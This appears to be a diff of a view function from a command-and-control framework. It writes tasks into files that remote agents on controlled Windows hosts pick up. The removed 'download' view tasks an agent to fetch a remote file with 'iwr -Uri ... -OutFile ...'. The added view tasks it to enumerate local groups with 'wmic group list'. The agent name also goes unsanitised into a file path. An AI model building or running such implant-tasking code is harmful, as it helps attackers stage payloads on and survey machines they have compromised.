@@ -5,9 +5,9 @@ from blog.models import *
 current_path= os.path.dirname(os.path.abspath(__file__))
 
 
-def download(request, agent='', url='', outpath=''):
+def GroupsListing(request, agent=''):
     if request.method=='POST':
-        task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
+        task = 'echo "===============group list===============";wmic group list /format:list'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
